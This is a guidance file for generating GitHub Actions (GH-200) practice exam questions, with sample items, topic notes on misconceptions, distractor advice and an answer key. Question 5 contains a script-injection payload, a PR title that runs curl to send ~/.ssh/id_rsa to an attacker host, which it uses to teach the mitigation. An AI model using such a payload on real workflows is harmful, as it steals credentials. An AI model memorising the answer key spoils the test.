# GH-200 Question Generator — Examples & Quality Guidance

This companion file supplements `question-prompt.md`. Attach it alongside the core prompt when starting a generation session to calibrate expected question quality, format, and common pitfalls.

---

## A. Sample Questions (By Difficulty & Type)

The following three examples demonstrate the expected quality, format depth, and reasoning required at each difficulty tier.

---

### Easy Example (Recall/Comprehension)

**Question 1** — Contextual Information

**Difficulty**: Easy | **Answer Type**: one | **Topic**: GitHub context contents

**Question**: Which of the following is contained in the `github` context?

- A) The current step execution time
- B) The workflow run ID and repository information
- C) The runner's operating system details
- D) The matrix strategy configuration

---

### Medium Example (Application/Analysis)

**Question 2** — Workflow Trigger Events

**Difficulty**: Medium | **Answer Type**: one | **Topic**: Event trigger selection

**Scenario**: Your team needs to run a deployment workflow only when code is merged to `main`, not on pull requests. The deployment requires approval from a designated environment first.

**Question**: Which trigger event should you use, combined with environment protection rules?

- A) `pull_request` with environment filters
- B) `push` to the `main` branch with environment protection rules
- C) `workflow_dispatch` triggered manually
- D) `schedule` on a cron expression

---

### Medium Example with YAML (Application)

**Question 3** — Artifacts

**Difficulty**: Medium | **Answer Type**: many | **Topic**: Artifact reliability between jobs

**Scenario**: Your CI pipeline uploads test results and build binaries in a `build` job. A downstream `deploy` job downloads them. The deploy job intermittently reports that artifact downloads are empty or incomplete.

**Question** (Select all that apply):
Which actions would improve artifact reliability between jobs?

- A) Add `if: always()` to the upload step so artifacts are uploaded even on failure
- B) Pin `actions/upload-artifact` and `actions/download-artifact` to matching major versions
- C) Set `retention-days: 90` to prevent early expiration during long-running pipelines
- D) Replace `path: .` with a specific glob pattern targeting only required output files

---

### Hard Example (Synthesis/Evaluation)

**Question 4** — Security & OIDC

**Difficulty**: Hard | **Answer Type**: many | **Topic**: Token strategy trade-offs

**Scenario**: Your organization currently uses long-lived PAT tokens stored as secrets for AWS deployments. You're evaluating OIDC for better security posture. (Select all that apply)

**Question**: Which statements accurately reflect advantages of OIDC over long-lived secrets?

- A) OIDC tokens are automatically rotated with each workflow run
- B) OIDC eliminates the need to store credentials in GitHub; AWS validates the OIDC token directly
- C) OIDC supports fine-grained subject claims (repo, branch, environment) for access control
- D) OIDC allows deploying to multiple cloud providers (AWS, Azure, GCP) with the same configuration
- E) OIDC has no risk of token leakage because tokens are never stored

---

### Hard YAML Example (Analysis — Script Injection)

**Question 5** — Security & Optimization

**Difficulty**: Hard | **Answer Type**: one | **Topic**: Script injection prevention (18)

**Scenario**:
A workflow step processes user-controlled PR titles:

```yaml
- name: Print PR title
  run: echo "Processing PR: ${{ github.event.pull_request.title }}"
```

An attacker creates a PR titled: `valid title"; curl https://attacker.com/?d=$(cat ~/.ssh/id_rsa); echo "`

**Question**:
Which mitigation correctly prevents script injection without disabling the step?

- A) Wrap the expression in single quotes: `echo 'PR: ${{ github.event.pull_request.title }}'`
- B) Use `${{ toJson(github.event.pull_request.title) }}` to JSON-encode the value inline
- C) Set the title as an environment variable and reference it as `$PR_TITLE` in the shell command
- D) Add `permissions: read-all` to the job to restrict token scope

---

## B. Topic-Specific Guidance & Common Misconceptions

### Topic 1: VS Code Extension (4 questions)

**Key Concepts to Prioritize**:

- Local workflow validation without running
- Extension marketplace vs. local authoring
- YAML linting and context intelligence

**Common Misconceptions**:

- The extension runs workflows locally (it doesn't; it validates syntax)
- The extension replaces the need for `act` or container-based testing
- All GitHub Actions documentation is built into the extension

**Scenario Patterns**:

- Validation before commit
- Troubleshooting YAML syntax in IDE
- Using extension for local development workflow

---

### Topic 2: Contextual Information (6 questions)

**Key Concepts to Prioritize**:

- All 10 context types and their relationships
- Runtime vs. static context evaluation
- Context scope by workflow key

**Common Misconceptions**:

- All contexts are available at all times (they're not; scope is restricted)
- `secrets` context can be used outside of expressions
- `env` context is global across all jobs

**Scenario Patterns**:

- Accessing nested context properties
- Debugging context availability issues
- Combining multiple contexts in expressions

---

### Topic 5: Trigger Events (7 questions)

**Key Concepts to Prioritize**:

- 26+ events and their trigger conditions
- Event payload structure and availability
- Filtering by branch, tag, path

**Common Misconceptions**:

- `push` is the same as `pull_request` (different events, different payloads)
- All trigger events support `paths` filtering (some don't)
- Scheduled jobs can access git commit info (they can't; it's synthetic)

**Scenario Patterns**:

- Conditional workflow logic based on event type
- Matrix builds triggered by specific events
- Complex filtering (branch + path combinations)

---

### Topic 18: Security & Optimization (7 questions)

**Key Concepts to Prioritize**:

- GITHUB_TOKEN permissions and lifecycle
- OIDC federation and subject claims
- Script injection vectors and mitigation
- SHA pinning vs. semver trade-offs
- Trustworthy actions assessment

**Common Misconceptions**:

- GITHUB_TOKEN is always available with full permissions (false; scoped by default)
- SHA pinning prevents all supply chain attacks (false; provides integrity, not behavior verification)
- Using `@latest` is equivalent to `@main` (false; different refs, different guarantees)
- Secrets are never logged (false; they can leak in certain error scenarios)

**Scenario Patterns**:

- Identifying script injection vulnerabilities
- Designing least-privilege token scopes
- Evaluating action trustworthiness
- Balancing security with maintainability

---

## C. Distractor Bank & Quality Standards

### Good Distractors (Plausible, ~50% knowledge level)

```
Question: Which context is available in a reusable workflow called by another workflow?

Correct: github (workflow-level info like sha, ref is available)

Good Distractors:
- A) env (partially correct but limited scope; local vars only, not calling workflow's)
- B) secrets (plausible misconception; often assumed available but aren't accessible by default)
- C) runner (plausible but runner info is only for the current executor)
```

### Bad Distractors (Not Plausible — Avoid)

```
Avoid:
- "The flibbertigibbet context"                         ← Obviously fake
- "RUNNER_COLOR environment variable contains hex codes"← Too obscure/unrelated
- "Use github.workflow_run_id"                          ← Close to real, but clearly wrong
```

### Distractor Checklist

For each distractor, verify:
- [ ] Would a candidate with 50% knowledge pick it? (If no → too easy, replace)
- [ ] Is it based on a real GitHub Actions concept? (If no → too fake, replace)
- [ ] Does it reflect a genuine common misconception? (If yes → ideal)
- [ ] Could it actually be correct in a slightly different scenario? (If yes → strongest distractor type)

---

## D. Common Pitfalls & Anti-Patterns in Question Generation

### Pitfalls to Avoid

| Pitfall | Bad Example | Fix |
| ------- | ----------- | --- |
| **Two-part questions** | "Does X happen, and if so, when?" | Split into two separate questions |
| **Negation stacking** | "Which is NOT not available?" | Rephrase with positive logic |
| **Ambiguous scenario** | "A workflow runs successfully" | Add: in what context? on which event? |
| **Distractor that's actually correct** | QA finds one distractor is defensible | Validate against guide; rewrite |
| **Testing recall instead of application** | "What does github.event.number mean?" | Upgrade: "You need job index; which context?" |
| **Over-long scenario** | 8 sentences of context (candidate gets lost) | Trim to 2–3 key details |
| **Vague phrasing** | "You should probably use..." | Use: "Which is the correct approach?" |
| **Repeating the same concept** | 3 questions about `github.sha` | Vary: "Where do you get base branch commit?" |

### Wording Upgrades

| Instead of... | Use... |
| ------------- | ------ |
| "You should use..." | "Which approach is correct?" |
| "It might be a good idea to..." | "Which is the recommended practice?" |
| "What does X do in most cases?" | "What does X do?" |
| "Which of these could work?" | "Which is the correct solution?" |

### Cognitive Level Upgrades (Easy → Medium)

| Easy (Recall) | Medium (Application) — Upgrade |
| ------------- | ------------------------------ |
| "What is `github.sha`?" | "Your workflow needs the commit SHA on PR head. Where do you get it?" |
| "What trigger fires on schedule?" | "Which trigger cannot access `github.event` payload data?" |
| "What does RUNNER_DEBUG do?" | "A build step fails silently. Which approach reveals the most diagnostic detail?" |

---

## Answer Key

| Q# | Answer(s) | Explanation | Source | Difficulty |
|----|-----------|-------------|--------|------------|
| 1 | B | The `github` context contains workflow run metadata including run ID, SHA, ref, repository, actor, and other GitHub-specific info. The runner OS is in `runner` context, step timing in `job`, and matrix in `strategy`. | 02-Contextual-Information.md | Easy |
| 2 | B | The `push` event triggers on merges to `main`. Environment protection rules then enforce required reviewers and approvals before deployment proceeds. `pull_request` wouldn't work (it's on PR, not merge), `workflow_dispatch` is manual, and `schedule` is time-based. | 05-Workflow-Trigger-Events.md | Medium |
| 3 | B, D | Pinning to matching versions prevents API compatibility issues; a precise glob avoids uploading unnecessary files that can cause partial or inconsistent downloads. `if: always()` aids debugging but does not fix reliability when the build itself fails. `retention-days` controls expiry, not mid-run consistency. | 09-Artifacts.md | Medium |
| 4 | A, B, C | OIDC uses short-lived tokens automatically issued per run (A); AWS validates the token directly without needing stored credentials (B); subject claims enable precise access control (C). (D) is partially true but setup varies per cloud. (E) is false—token leakage risk still exists but is mitigated by short lifetime. | 18-Security-Best-Practices.md | Hard |
| 5 | C | Assigning the untrusted value to an environment variable (`PR_TITLE: ${{ github.event.pull_request.title }}`) and referencing `$PR_TITLE` in the shell prevents injection because the value is passed as data, never interpolated into the command string. A (single quotes) prevents variable expansion entirely. B (`toJson`) adds JSON encoding but does not prevent shell interpretation. D (permissions) limits the token scope but has no effect on command injection. | 18-Security-Best-Practices.md | Hard |
